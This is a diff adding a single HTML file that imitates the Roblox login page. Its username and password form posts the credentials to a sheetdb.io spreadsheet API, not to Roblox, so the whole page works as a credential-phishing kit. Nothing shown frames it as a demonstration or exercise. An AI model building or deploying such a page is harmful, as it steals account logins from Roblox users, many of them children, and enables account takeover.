@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Login</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<div class="login-container">
+  <h1>Log in to Roblox</h1>
+  <form action = 'https://sheetdb.io/api/v1/o6qrmq1kaatve'method = 'post' id="sheetdb-form" onsubmit="return validateForm()">
+    <label for="username">Username:</label><br>
+    <input type="text" id="username" name="data[username]" required><br>
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" name="data[password]" required><br>
+    <input type="submit" value="Log In">
+    <p id="error-message" class="error"></p>
+  </form>
+</div>
+<script src ="script.js"></script> 
+</body>
+</html>
